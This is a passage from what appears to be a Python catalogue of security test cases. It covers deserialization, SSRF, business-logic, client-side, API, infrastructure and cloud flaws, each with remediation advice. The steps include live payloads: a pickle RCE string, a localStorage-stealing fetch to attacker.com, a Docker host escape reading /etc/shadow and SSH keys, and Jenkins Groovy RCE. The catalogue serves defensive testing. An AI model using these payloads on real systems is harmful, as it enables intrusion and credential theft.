        "description": "PHP's unserialize() on attacker-controlled data triggers magic methods (__wakeup, __destruct) leading to RCE, LFI, or SSRF via object graph manipulation.",
        "attack_pattern": "Craft serialized PHP objects that trigger gadget chains on deserialization.",
        "steps": [
            "Identify cookies, POST params, or file content passed to unserialize()",
            "Craft a basic test: O:8:\"stdClass\":0:{} — check if accepted without error",
            "Use PHPGGC to generate gadget chains: phpggc -l (list), phpggc Laravel/RCE1 exec 'id'",
            "Base64 encode and submit the payload in the vulnerable parameter",
            "Test in session files, cache layers, or template caches that use PHP serialization",
        ],
        "expected_result": "Never pass user-controlled data to unserialize(). Use JSON instead. Implement Suhosin patch.",
        "cwe": "CWE-502", "owasp": "A08:2021",
        "tools": {"nuclei_tags": ["deserialization", "rce"]},
        "applicable_to": ["web"], "tags": ["deserialization", "php", "rce", "critical"],
    },
    {
        "id": "TC-INJ012", "title": "Python Pickle / YAML Deserialization",
        "category": "Deserialization", "severity": "critical",
        "description": "Python's pickle and PyYAML with Loader=Loader allow arbitrary code execution during object deserialization.",
        "attack_pattern": "Submit crafted pickle or YAML payload to deserializing endpoints.",
        "steps": [
            "Test pickle: import pickle; pickle.loads(b'cos\\nsystem\\n(S\\'id\\'\\ntR.') — sends system('id')",
            "Test YAML: !!python/object/apply:subprocess.check_output [[id]] — using PyYAML full Loader",
            "Submit as API body, file upload, or configuration value",
            "Check Celery/Redis task queues using pickle for task serialization",
            "Check machine learning endpoints receiving model files (pickle-serialized models)",
        ],
        "expected_result": "Use json/msgpack. If pickle required, sign with HMAC. Never pickle untrusted data.",
        "cwe": "CWE-502", "owasp": "A08:2021",
        "tools": {},
        "applicable_to": ["api", "web"], "tags": ["deserialization", "python", "rce", "critical"],
    },
    {
        "id": "TC-INJ013", "title": "PDF / Report Generation Injection",
        "category": "Advanced Injection", "severity": "high",
        "description": "Server-side PDF generators (wkhtmltopdf, WeasyPrint, headless Chrome) that render user content can be abused for SSRF and LFI via HTML/CSS injection.",
        "attack_pattern": "Inject HTML payloads into PDF generation inputs to trigger SSRF or file read.",
        "steps": [
            "Find features that generate PDFs from user content: reports, invoices, email-to-PDF",
            "SSRF: inject <iframe src='http://169.254.169.254/'> or <img src='http://attacker.com'>",
            "LFI: inject <iframe src='file:///etc/passwd'> (wkhtmltopdf is vulnerable)",
            "Annotate: inject @page { background: url('http://attacker.com/') } via CSS",
            "Test: <script>document.write(document.cookie)</script> if JavaScript is enabled in PDF engine",
        ],
        "expected_result": "Disable JavaScript in PDF engine. Sanitize HTML input. Block file:// and RFC 1918 addresses.",
        "cwe": "CWE-918", "owasp": "A10:2021",
        "tools": {},
        "applicable_to": ["web"], "tags": ["ssrf", "pdf", "injection"],
    },
    {
        "id": "TC-INJ014", "title": "HTTP Parameter Pollution (HPP)",
        "category": "Advanced Injection", "severity": "medium",
        "description": "Sending duplicate parameters exploits inconsistent parsing between WAF, load balancer, and app server — bypassing security checks or altering logic.",
        "attack_pattern": "Duplicate security-critical parameters to confuse parsing layers.",
        "steps": [
            "Duplicate: ?user_id=attacker&user_id=victim — check which value the app uses",
            "Test in OAuth: ?redirect_uri=allowed.com&redirect_uri=evil.com",
            "Test in signatures: &amount=100&amount=1 — WAF may read first, app reads last",
            "Test Rails-style: ?ids[]=1&ids[]=2&ids[]=victim_id in batch requests",
            "Test JSON: {\"role\": \"user\", \"role\": \"admin\"} — parsers may use last value",
        ],
        "expected_result": "Explicitly define parameter handling behavior. Never trust duplicated parameters for security decisions.",
        "cwe": "CWE-235", "owasp": "A03:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["hpp", "injection", "bypass"],
    },
    {
        "id": "TC-INJ015", "title": "Regex ReDoS (Denial of Service)",
        "category": "Advanced Injection", "severity": "medium",
        "description": "Catastrophic backtracking in regex validation causes exponential CPU usage, enabling single-request denial of service.",
        "attack_pattern": "Send carefully crafted input that triggers catastrophic backtracking in server-side regex.",
        "steps": [
            "Identify validation endpoints: email, URL, phone number, username validators",
            "Test email: a@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa! (trailing ! causes backtrack on greedy patterns)",
            "Use ReDoS checker: https://recheck.io or redos-checker package for detected patterns",
            "Measure response time: >5s for a single request indicates DoS vulnerability",
            "Check for patterns like (a+)+ or ([a-zA-Z]+)* in server-side validation code",
        ],
        "expected_result": "Use non-backtracking regex engines. Limit input length. Set regex timeout.",
        "cwe": "CWE-1333", "owasp": "A04:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["redos", "dos", "regex"],
    },
    {
        "id": "TC-INJ016", "title": "GraphQL Injection & Deep Recursion Attack",
        "category": "Advanced Injection", "severity": "high",
        "description": "GraphQL lacks built-in query depth/complexity limits — deeply nested queries consume exponential server resources, and injection is possible via string interpolation in resolvers.",
        "attack_pattern": "Send deeply nested query or inject GraphQL metacharacters into query variables.",
        "steps": [
            "Depth attack: { user { friends { friends { friends { friends { id } } } } } } (10+ levels)",
            "Test introspection first: {__schema{types{name}}} — if enabled, schema is exposed",
            "Alias abuse: { a:users(page:1){id} b:users(page:2){id} ... z:users(page:26){id} }",
            "String interpolation SQLi: { user(name: \"admin' OR '1'='1\") { secretField } }",
            "Test fragment cycles if not prevented — creates infinite resolution loops",
        ],
        "expected_result": "Implement query depth limit (≤10), query cost analysis, and disable introspection in production.",
        "cwe": "CWE-400", "owasp": "A04:2021",
        "tools": {"nuclei_tags": ["graphql"]},
        "applicable_to": ["api"], "tags": ["graphql", "dos", "injection"],
    },

    # ── SESSION MANAGEMENT (additional) ───────────────────────────────────────
    {
        "id": "TC-S004", "title": "Session Token in URL",
        "category": "Session Management", "severity": "high",
        "description": "Session tokens in URLs appear in server logs, browser history, Referer headers, and browser autocomplete — trivially stolen.",
        "attack_pattern": "Observe if the application passes session or auth tokens in URL query strings.",
        "steps": [
            "Monitor all requests — check if token, session_id, auth, or jwt appear in URL params",
            "Test 'share this link' features — do they embed session-authenticated URLs?",
            "Check server logs — URL parameters are typically logged in access logs",
            "Check Referer header when clicking external links from authenticated pages",
            "Test OAuth flows: does authorization code appear in URL and remain after navigation?",
        ],
        "expected_result": "Tokens only in headers or cookies. Never in URLs. Implement anti-caching controls.",
        "cwe": "CWE-598", "owasp": "A07:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["session", "token-leak"],
    },
    {
        "id": "TC-S005", "title": "Concurrent Session Control",
        "category": "Session Management", "severity": "low",
        "description": "Applications allowing unlimited concurrent sessions enable persistent access even after a user changes their password.",
        "attack_pattern": "Log in from multiple devices and verify all sessions coexist.",
        "steps": [
            "Log in from browser A and browser B simultaneously — verify both sessions work",
            "Change password in browser A — test if browser B session is invalidated",
            "Check for 'active sessions' management page — can user see and revoke sessions?",
            "Test: JWT-based apps often can't revoke individual sessions (must rotate JWT secret)",
            "Verify admin-triggered session revocation (e.g., on account lock) invalidates all sessions",
        ],
        "expected_result": "Password change invalidates all existing sessions. Session management page available.",
        "cwe": "CWE-613", "owasp": "A07:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["session", "concurrent"],
    },
    {
        "id": "TC-S006", "title": "Cross-Subdomain Session Sharing",
        "category": "Session Management", "severity": "medium",
        "description": "Session cookies set on the root domain (.target.com) are sent to all subdomains, including attacker-controlled ones via subdomain takeover.",
        "attack_pattern": "Verify cookie domain scope and chain with subdomain takeover for credential harvesting.",
        "steps": [
            "Inspect session cookie: Set-Cookie: session=...; Domain=.target.com",
            "If Domain=.target.com, cookies are sent to all subdomains",
            "Identify vulnerable subdomains (from TC-T001 subdomain takeover)",
            "Take over subdomain → host page that reads cookies (HttpOnly prevents this, but can capture auth flows)",
            "Test if staging/dev subdomain has the same session secret (session fixation across environments)",
        ],
        "expected_result": "Session cookies scoped to specific domain (not wildcard). HttpOnly on all session cookies.",
        "cwe": "CWE-614", "owasp": "A05:2021",
        "tools": {},
        "applicable_to": ["web"], "tags": ["session", "cookie", "subdomain"],
    },

    # ── BUSINESS LOGIC (additional) ───────────────────────────────────────────
    {
        "id": "TC-BL005", "title": "Free Trial / Subscription Bypass",
        "category": "Business Logic", "severity": "high",
        "description": "Trial period logic or feature gating enforced only client-side or via easily manipulated parameters allows permanent free access.",
        "attack_pattern": "Manipulate feature flags, subscription status, or trial expiry parameters.",
        "steps": [
            "Intercept requests: look for plan=free, trial_expired=true, features=[] in requests/responses",
            "Modify subscription status in request: {\"plan\": \"enterprise\"} or remove plan restriction",
            "Test API endpoints with free token: can you call enterprise-only API endpoints?",
            "Test if expired trial still works after changing local date (time-of-check vs time-of-use)",
            "Check if cookie/localStorage controls plan tier: planType=enterprise in browser storage",
        ],
        "expected_result": "Feature gating enforced server-side. Subscription status fetched from authoritative billing source, not client-supplied.",
        "cwe": "CWE-284", "owasp": "A04:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["business-logic", "authorization", "subscription"],
    },
    {
        "id": "TC-BL006", "title": "Coupon / Promo Code Stacking & Abuse",
        "category": "Business Logic", "severity": "medium",
        "description": "Coupon systems often allow multiple applications, bypassing single-use restrictions via race conditions or logic flaws.",
        "attack_pattern": "Stack multiple coupons, reuse single-use codes, or combine conflicting discounts.",
        "steps": [
            "Apply same coupon twice in one order (race condition — send simultaneous requests)",
            "Apply multiple different coupons — check if stacking is prevented",
            "Share referral link with yourself across two accounts — claim bonus twice",
            "Test coupon transfer: apply friend's referral to your own purchase",
            "Test currency arbitrage: apply US coupon on EU account or vice versa for higher absolute discount",
        ],
        "expected_result": "Atomic coupon redemption. Database-level constraint on single use. Server-validates coupon eligibility.",
        "cwe": "CWE-841", "owasp": "A04:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["business-logic", "payment", "coupon"],
    },
    {
        "id": "TC-BL007", "title": "Negative Quantity / Value Exploitation",
        "category": "Business Logic", "severity": "high",
        "description": "E-commerce applications accepting negative quantities or amounts can result in credit to attacker or negative totals that effectively become refunds.",
        "attack_pattern": "Submit negative integers for quantity, amount, or discount fields.",
        "steps": [
            "In shopping cart: change quantity to -1, -100 — does the total become negative?",
            "Submit negative price: {\"amount\": -50.00} in purchase APIs",
            "Test refund amount: request refund for more than the original purchase amount",
            "Test: add item to cart (positive), add same item as negative quantity — net = 0, but coupon applied to gross",
            "Test gift card redemption with negative redemption amount",
        ],
        "expected_result": "Server enforces minimum values (qty ≥ 1, amount > 0). Business rules validated on backend.",
        "cwe": "CWE-20", "owasp": "A04:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["business-logic", "payment", "negative-values"],
    },
    {
        "id": "TC-BL008", "title": "Mass Account Creation / Resource Abuse",
        "category": "Business Logic", "severity": "medium",
        "description": "Lack of rate limiting on account creation allows attackers to create thousands of accounts, exhausting free resources, trial quotas, or storage limits.",
        "attack_pattern": "Automate account creation to exhaust service quotas or resources.",
        "steps": [
            "Register accounts with generated emails: test+1@gmail.com, test+2@gmail.com (Gmail plus addressing)",
            "Use disposable email services to bypass email uniqueness checks",
            "Test if CAPTCHA can be bypassed or is absent on registration",
            "Measure registration rate limit — how many per minute per IP?",
            "Test if accounts can consume limited resources (storage, API credits, compute) before expiry",
        ],
        "expected_result": "Email verification required before resource allocation. CAPTCHA on registration. Rate limiting per IP and email domain.",
        "cwe": "CWE-770", "owasp": "A04:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["business-logic", "rate-limit", "registration"],
    },
    {
        "id": "TC-BL009", "title": "Email Domain / Tenant Hijacking",
        "category": "Business Logic", "severity": "critical",
        "description": "Applications allowing users to claim a company email domain as an org admin can be exploited if the domain is poorly validated — allowing attackers to gain admin access to an existing org.",
        "attack_pattern": "Claim a domain you don't own to become admin of an existing organization.",
        "steps": [
            "Register with an email from target company domain if domain claim is based on email address only",
            "Test: can you claim a subdomain of an already-claimed domain?",
            "Test domain ownership verification: does the app actually verify DNS TXT record ownership?",
            "Test: claim a domain that partially matches existing org domain (unicode homoglyphs)",
            "Test: register with typosquat domain that looks like a real company domain",
        ],
        "expected_result": "Domain claim requires DNS TXT record verification with unique per-org challenge. Cannot claim already-claimed domains.",
        "cwe": "CWE-284", "owasp": "A01:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["business-logic", "account-takeover", "critical"],
    },
    {
        "id": "TC-BL010", "title": "Insecure Direct Object Reference on Account Deletion",
        "category": "Business Logic", "severity": "high",
        "description": "Account deletion endpoints with IDOR allow attackers to delete any user account.",
        "attack_pattern": "Delete another user's account by substituting their user ID.",
        "steps": [
            "Trigger account deletion as user A: DELETE /api/users/A_ID",
            "Replace A_ID with B_ID (another user's ID): DELETE /api/users/B_ID",
            "Test self-deletion endpoint: does it require password re-confirmation?",
            "Test admin-only deletion endpoint as regular user",
            "Test soft-delete: are deleted accounts actually removed or just flagged?",
        ],
        "expected_result": "Account deletion requires current password re-entry. Server validates deletion is for own account.",
        "cwe": "CWE-639", "owasp": "A01:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["business-logic", "idor", "account-deletion"],
    },

    # ── CLIENT-SIDE (additional) ──────────────────────────────────────────────
    {
        "id": "TC-CS007", "title": "postMessage Cross-Origin Communication Attack",
        "category": "Client-Side", "severity": "high",
        "description": "Window.postMessage() listeners without origin validation process messages from any origin, enabling data theft and privilege escalation.",
        "attack_pattern": "Send postMessage events from a malicious origin to the target app's listener.",
        "steps": [
            "Find postMessage listeners: grep -r 'addEventListener.*message' in JS source",
            "Check origin validation: does listener verify event.origin before processing?",
            "Send test: window.opener.postMessage({action: 'transferFunds', amount: 1000}, '*')",
            "Host attacker page: open target in popup, send postMessage from attacker origin",
            "Test: if listener uses event.data directly in innerHTML or eval — XSS via postMessage",
        ],
        "expected_result": "All postMessage listeners validate event.origin against an allowlist before processing.",
        "cwe": "CWE-346", "owasp": "A05:2021",
        "tools": {},
        "applicable_to": ["web"], "tags": ["postmessage", "client-side", "xss"],
    },
    {
        "id": "TC-CS008", "title": "Subresource Integrity (SRI) Missing",
        "category": "Client-Side", "severity": "medium",
        "description": "External scripts loaded without SRI hashes can be replaced with malicious content if the CDN is compromised — enabling universal XSS against all users.",
        "attack_pattern": "Verify external script/style tags for SRI integrity attributes.",
        "steps": [
            "Inspect HTML source for <script src='https://cdn.example.com/lib.js'> without integrity=",
            "Test all third-party CDN-hosted JavaScript and CSS files",
            "Simulate CDN compromise: modify local hosts to serve modified JS and see if it executes",
            "Use Burp to intercept CDN response and inject malicious payload",
            "Check if the page still works when CDN is unavailable (SRI blocks changed content)",
        ],
        "expected_result": "All external resources include integrity='sha384-...' attribute. crossorigin='anonymous' set.",
        "cwe": "CWE-829", "owasp": "A06:2021",
        "tools": {"nuclei_tags": ["headers", "misconfig"]},
        "applicable_to": ["web"], "tags": ["sri", "supply-chain", "client-side"],
    },
    {
        "id": "TC-CS009", "title": "Browser Storage (localStorage/sessionStorage) Sensitive Data",
        "category": "Client-Side", "severity": "medium",
        "description": "Sensitive tokens, PII, and credentials stored in browser localStorage are accessible to any JavaScript on the page — including XSS payloads.",
        "attack_pattern": "Inspect localStorage and sessionStorage for sensitive values via browser console.",
        "steps": [
            "Open browser console: Object.keys(localStorage) — enumerate all keys",
            "Check: localStorage.getItem('auth_token'), localStorage.getItem('user'), etc.",
            "Look for: JWT tokens, API keys, credit card last4, PII, session IDs",
            "Test XSS to steal storage: <script>fetch('http://attacker.com?d='+btoa(JSON.stringify(localStorage)))</script>",
            "Check sessionStorage as well: same browser tab persistence issues",
        ],
        "expected_result": "Never store sensitive tokens in localStorage. Use HttpOnly cookies or in-memory storage.",
        "cwe": "CWE-312", "owasp": "A02:2021",
        "tools": {},
        "applicable_to": ["web"], "tags": ["storage", "client-side", "token-leak"],
    },
    {
        "id": "TC-CS010", "title": "Content Security Policy (CSP) Analysis & Bypass",
        "category": "Client-Side", "severity": "medium",
        "description": "Weak CSP policies with 'unsafe-inline', 'unsafe-eval', wildcards, or trusted but exploitable domains fail to prevent XSS execution.",
        "attack_pattern": "Enumerate CSP policy weaknesses and test bypass vectors.",
        "steps": [
            "Extract CSP from response: Content-Security-Policy or <meta http-equiv='Content-Security-Policy'>",
            "Test 'unsafe-inline': can inline <script> tags execute?",
            "Test 'unsafe-eval': can eval(), setTimeout(string) execute?",
            "Test script-src with whitelisted CDN: inject JSONP endpoint on trusted CDN to execute arbitrary JS",
            "Test data: URI: <script src='data:text/javascript,alert(1)'></script>",
            "Use CSP Evaluator at csp-evaluator.withgoogle.com to identify bypasses",
        ],
        "expected_result": "Strict CSP without unsafe-inline/eval. Use nonces or hashes. No wildcard origins.",
        "cwe": "CWE-693", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["headers", "csp"]},
        "applicable_to": ["web"], "tags": ["csp", "xss", "headers"],
    },
    {
        "id": "TC-CS011", "title": "Service Worker Hijacking",
        "category": "Client-Side", "severity": "high",
        "description": "Service workers persist in the browser and intercept all network requests. Registering a malicious service worker via XSS or an open redirect enables persistent XSS across page reloads.",
        "attack_pattern": "Register a malicious service worker via a writable scope on the target origin.",
        "steps": [
            "Find any path on target.com that can serve attacker-controlled JavaScript content",
            "File upload + JSONP or JS header injection can turn a path into a SW registration vector",
            "Register SW: navigator.serviceWorker.register('/uploads/attacker.js') from XSS context",
            "SW intercepts all requests: onfetch — logs credentials from all subsequent pages",
            "Test if existing SW code has postMessage vulnerabilities",
        ],
        "expected_result": "Restrict Service Worker scope. Serve SW from a separate non-sensitive origin.",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "tools": {},
        "applicable_to": ["web"], "tags": ["service-worker", "xss", "persistent"],
    },

    # ── API SECURITY (additional) ─────────────────────────────────────────────
    {
        "id": "TC-API007", "title": "Server-Side Request Forgery via Webhooks",
        "category": "API Security", "severity": "high",
        "description": "Webhook URL registration allows attackers to point server-side HTTP requests at internal services, cloud metadata, or arbitrary external hosts.",
        "attack_pattern": "Register a webhook URL pointing to internal infrastructure targets.",
        "steps": [
            "Find webhook registration: notification callbacks, event subscriptions, integration configs",
            "Register: http://169.254.169.254/latest/meta-data/ (AWS IMDS)",
            "Register: http://localhost/admin, http://10.0.0.1/api",
            "Use DNS rebinding: register attacker.com which resolves to 127.0.0.1 after initial check",
            "Monitor what data the server includes in webhook payload — does it include auth tokens?",
        ],
        "expected_result": "Webhook URLs validated against allowlist. RFC 1918 addresses blocked. Use allowlist for URL schemes.",
        "cwe": "CWE-918", "owasp": "A10:2021",
        "tools": {},
        "applicable_to": ["api", "web"], "tags": ["ssrf", "webhook", "api"],
    },
    {
        "id": "TC-API008", "title": "API Versioning Security Regression",
        "category": "API Security", "severity": "high",
        "description": "Older API versions (v1, v2, beta) often lack security controls applied to newer versions — auth checks, rate limiting, and input validation added later.",
        "attack_pattern": "Access sensitive functionality through deprecated API versions.",
        "steps": [
            "Discover all API versions: /api/v1/, /api/v2/, /api/v3/, /api/beta/, /api/legacy/",
            "Access admin endpoints in older versions: GET /api/v1/admin/users (v2 might be restricted)",
            "Test auth bypass in old versions: do they accept different auth mechanisms?",
            "Check if v1 returns more data fields than v2 (data exposure regression)",
            "Test if mobile app still calls deprecated v1 endpoints with fewer restrictions",
        ],
        "expected_result": "All API versions enforce identical security controls. Deprecated versions decommissioned with 410 Gone.",
        "cwe": "CWE-1059", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["exposure", "api"]},
        "applicable_to": ["api"], "tags": ["api", "versioning", "regression"],
    },
    {
        "id": "TC-API009", "title": "Unrestricted API Resource Consumption",
        "category": "API Security", "severity": "high",
        "description": "APIs without resource controls allow attackers to trigger expensive operations, exhaust server resources, or cause financial harm via API abuse.",
        "attack_pattern": "Invoke resource-intensive endpoints repeatedly or with large payloads.",
        "steps": [
            "Find expensive operations: PDF generation, email sending, image processing, AI inference",
            "Call without rate limits: measure if 1000 requests succeed in 1 minute",
            "Test large payload: send max-size file to image processor, max-length text to AI endpoint",
            "Test recursive operations: tree traversal with deep nesting, circular references",
            "Test email bombing: trigger password reset 1000 times for victim's email",
        ],
        "expected_result": "Rate limits on all expensive operations. Max payload sizes enforced. Cost-per-user monitoring.",
        "cwe": "CWE-770", "owasp": "A04:2021",
        "tools": {},
        "applicable_to": ["api"], "tags": ["api", "dos", "rate-limit", "resource-consumption"],
    },
    {
        "id": "TC-API010", "title": "API Key Exposure in Client-Side Code / Requests",
        "category": "API Security", "severity": "critical",
        "description": "API keys for third-party services (Stripe, Twilio, SendGrid, AWS) hardcoded in frontend JavaScript or transmitted in client requests are freely discoverable.",
        "attack_pattern": "Extract API keys from JavaScript bundles and test their scope.",
        "steps": [
            "Grep JS bundles: grep -E 'sk_live_|pk_live_|AKID|AIza|SG\\.|AC[a-f0-9]{32}' main.js",
            "Check window.* object: window.__CONFIG__, window.ENV in browser console",
            "Monitor XHR/Fetch requests for API keys passed in query params or headers",
            "Test key scope: can Stripe publishable key be used to read customer data? (Should be no)",
            "Test SendGrid/Twilio keys: can attacker send emails/SMS on company's account/budget?",
        ],
        "expected_result": "Only public keys (Stripe publishable) in frontend. All secret keys server-side only. Scope keys to minimum required permissions.",
        "cwe": "CWE-798", "owasp": "A02:2021",
        "tools": {"nuclei_tags": ["exposure", "token"]},
        "applicable_to": ["web", "api"], "tags": ["api-key", "secrets", "critical"],
    },
    {
        "id": "TC-API011", "title": "Swagger / OpenAPI Sensitive Endpoint Exposure",
        "category": "API Security", "severity": "medium",
        "description": "OpenAPI documentation exposed in production reveals all endpoints including internal and admin ones, providing a complete attack map.",
        "attack_pattern": "Enumerate OpenAPI spec and test documented endpoints with unauthorized credentials.",
        "steps": [
            "Find spec: /swagger.json, /openapi.json, /api/swagger.json, /v3/api-docs, /swagger-ui.html",
            "Import into Postman or Burp — enumerate all endpoints",
            "Identify endpoints tagged 'internal', 'admin', or with no auth defined",
            "Test each endpoint with: no auth, wrong role auth, and different org's auth",
            "Check if spec exposes environment, server URLs, or schema details",
        ],
        "expected_result": "Swagger disabled in production. Internal docs behind VPN. All endpoints require auth.",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "swagger", "api"]},
        "applicable_to": ["api"], "tags": ["swagger", "api", "enumeration"],
    },

    # ── INFRASTRUCTURE (additional) ───────────────────────────────────────────
    {
        "id": "TC-N009", "title": "Docker Daemon Exposure",
        "category": "Infrastructure", "severity": "critical",
        "description": "Docker daemon exposed on TCP 2375 (unencrypted) or 2376 (TLS) allows full host compromise — container escape to root on host.",
        "attack_pattern": "Connect to exposed Docker API and run a privileged container.",
        "steps": [
            "Scan: nmap -p 2375,2376 <target>",
            "Connect: curl http://<target>:2375/v1.24/containers/json",
            "List images: curl http://<target>:2375/v1.24/images/json",
            "Escape to host: docker -H tcp://<target>:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh",
            "Extract credentials: cat /mnt/etc/shadow, cat /mnt/root/.ssh/id_rsa",
        ],
        "expected_result": "Docker daemon must not be exposed to the internet. Use Unix socket or mTLS with 2376.",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["docker", "exposure"], "nmap": ["-p 2375,2376"]},
        "applicable_to": ["network", "cloud"], "tags": ["docker", "container", "rce", "critical"],
    },
    {
        "id": "TC-N010", "title": "Nginx / Apache Misconfiguration",
        "category": "Infrastructure", "severity": "high",
        "description": "Common web server misconfigurations expose server status pages, enable directory listings, or allow path injection via alias traversal.",
        "attack_pattern": "Test web server-specific misconfiguration patterns.",
        "steps": [
            "Test Nginx alias traversal: GET /static../etc/passwd if alias /static/ → /var/www/static/",
            "Test server-status: GET /server-status (Apache), GET /nginx_status (Nginx)",
            "Test directory listing: GET /uploads/, GET /static/, GET /backup/",
            "Test Nginx off-by-slash: GET /api → /api/ redirect leaks 301 destination",
            "Check mime.types: does server execute CGI/PHP in upload directories?",
            "Test Nginx add_header inheritance: child location blocks don't inherit parent security headers",
        ],
        "expected_result": "Directory listing disabled. Alias paths use trailing slashes. Status pages blocked. Security headers on all locations.",
        "cwe": "CWE-16", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["nginx", "apache", "misconfig"]},
        "applicable_to": ["web", "network"], "tags": ["nginx", "apache", "misconfiguration"],
    },
    {
        "id": "TC-N011", "title": "DNS Rebinding Attack",
        "category": "Infrastructure", "severity": "high",
        "description": "DNS rebinding circumvents the browser same-origin policy by rapidly changing DNS responses, allowing malicious web pages to communicate with internal services.",
        "attack_pattern": "Use a DNS rebinding attack to reach internal APIs from the victim's browser.",
        "steps": [
            "Register a domain with TTL=1: first lookup → attacker IP, subsequent → target internal IP",
            "Host a page that makes repeated fetch() calls to same domain",
            "After rebind, fetch() reaches http://192.168.x.x/admin endpoint from victim's browser",
            "Browser sends any cookies set on the domain to the internal IP",
            "Use Singularity (nccgroup/singularity) for automated DNS rebinding",
        ],
        "expected_result": "Bind services to localhost only. Validate Host header on internal services. Use private DNS zones.",
        "cwe": "CWE-350", "owasp": "A05:2021",
        "tools": {},
        "applicable_to": ["network", "web"], "tags": ["dns-rebinding", "network", "cors"],
    },
    {
        "id": "TC-N012", "title": "SMTP Open Relay",
        "category": "Infrastructure", "severity": "high",
        "description": "Mail servers configured as open relays allow any external sender to send email through them, enabling spam campaigns and phishing from a trusted IP.",
        "attack_pattern": "Test if the mail server will relay email from and to external addresses.",
        "steps": [
            "Connect via telnet: telnet <target> 25",
            "EHLO attacker.com → MAIL FROM:<attacker@external.com> → RCPT TO:<victim@anydomain.com> → DATA → test message",
            "If server accepts: open relay confirmed",
            "Test VRFY and EXPN commands for user enumeration",
            "Test SMTP AUTH: are weak credentials accepted?",
        ],
        "expected_result": "SMTP only accepts connections from authenticated users or internal IPs. VRFY/EXPN disabled.",
        "cwe": "CWE-284", "owasp": None,
        "tools": {"nmap": ["--script smtp-open-relay", "-p 25,587"]},
        "applicable_to": ["network"], "tags": ["smtp", "email", "relay"],
    },
    {
        "id": "TC-N013", "title": "Jenkins / Continuous Integration Exposure",
        "category": "Infrastructure", "severity": "critical",
        "description": "Exposed Jenkins instances often have unauthenticated Script Console, allowing Groovy RCE, and store credentials for cloud providers and SCM systems.",
        "attack_pattern": "Access Jenkins Script Console or read stored credentials.",
        "steps": [
            "Test: GET /jenkins/ — check if accessible without auth",
            "Test Script Console: GET /jenkins/script — execute: println 'id'.execute().text",
            "Test credentials: GET /jenkins/credentials/store/system/domain/_/credential/<id>/config.xml",
            "Test: curl 'http://target:8080/scriptText' --data 'script=print \"id\".execute().text'",
            "Check pipeline configs for hardcoded credentials: withCredentials, env.SECRET",
        ],
        "expected_result": "Jenkins requires authentication. Script Console disabled in production. Credentials stored in secrets manager.",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["jenkins", "exposure", "rce"]},
        "applicable_to": ["network", "web", "cloud"], "tags": ["jenkins", "rce", "critical", "cicd"],
    },
    {
        "id": "TC-N014", "title": "Grafana / Kibana / Prometheus Unauthorized Access",
        "category": "Infrastructure", "severity": "high",
        "description": "Monitoring dashboards exposed without authentication reveal internal metrics, credentials in dashboard variables, and sometimes allow data source manipulation.",
        "attack_pattern": "Access monitoring dashboards without authentication.",
        "steps": [
            "Test: GET /grafana/ — check if dashboard loads without login",
            "Grafana CVE-2021-43798: GET /public/plugins/alertlist/../../../etc/passwd (path traversal)",
            "Check Grafana data source credentials: GET /api/datasources — may include DB passwords",
            "Test Kibana: GET /.kibana/_search?pretty — direct Elasticsearch queries",
            "Test Prometheus: GET /metrics, GET /api/v1/query?query=up — enumerate all metrics",
        ],
        "expected_result": "All monitoring dashboards require authentication. Exposed only on internal networks.",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["grafana", "kibana", "exposure"]},
        "applicable_to": ["network", "web"], "tags": ["monitoring", "exposure", "grafana"],
    },
    {
        "id": "TC-N015", "title": "Network Segmentation & Lateral Movement Paths",
        "category": "Infrastructure", "severity": "high",
        "description": "Flat network architecture allows an attacker who compromises one service to reach all internal services without restriction.",
        "attack_pattern": "From a compromised host, probe for reachable internal services.",
        "steps": [
            "From compromised container/VM, scan internal subnets: nmap -sn 10.0.0.0/8",
            "Probe common internal services: 80/443 (web apps), 22 (SSH), 3306/5432 (DB), 9200 (ES)",
            "Test: can app container reach database container directly (bypassing API)?",
            "Test: can web container reach admin API that should be internal-only?",
            "Check for shared credentials across services (SSH keys, service account passwords)",
        ],
        "expected_result": "Micro-segmentation enforced. Services communicate only with explicitly allowed peers. Least-privilege network policies.",
        "cwe": "CWE-1188", "owasp": "A05:2021",
        "tools": {"nmap": ["-sn", "-T4"]},
        "applicable_to": ["network", "cloud"], "tags": ["lateral-movement", "network", "segmentation"],
    },

    # ── CLOUD SECURITY (additional) ───────────────────────────────────────────
    {
        "id": "TC-C005", "title": "AWS Lambda Function URL / Unauthenticated",
        "category": "Cloud Security", "severity": "high",
        "description": "Lambda Function URLs without auth=AWS_IAM are publicly accessible. Misconfigured functions may expose internal APIs or execution capabilities.",
        "attack_pattern": "Enumerate Lambda Function URLs and invoke without authentication.",
        "steps": [
            "Find Lambda URLs: grep *.amazonaws.com/2015-03-31/functions or lambda URL format <id>.lambda-url.<region>.on.aws",
            "Invoke without auth: curl https://<id>.lambda-url.us-east-1.on.aws/",
            "Test path traversal in function routing: /function?path=../../etc/passwd",
            "Check environment variables in response or error messages",
            "Test SSRF from within function: call http://169.254.169.254/latest/meta-data/",
        ],
        "expected_result": "Lambda Function URLs require IAM authentication. Avoid Function URLs; use API Gateway with IAM auth.",
        "cwe": "CWE-284", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["aws", "cloud", "exposure"]},
        "applicable_to": ["cloud"], "tags": ["aws", "lambda", "cloud", "exposure"],
    },
    {
        "id": "TC-C006", "title": "Terraform State File Exposure",
        "category": "Cloud Security", "severity": "critical",
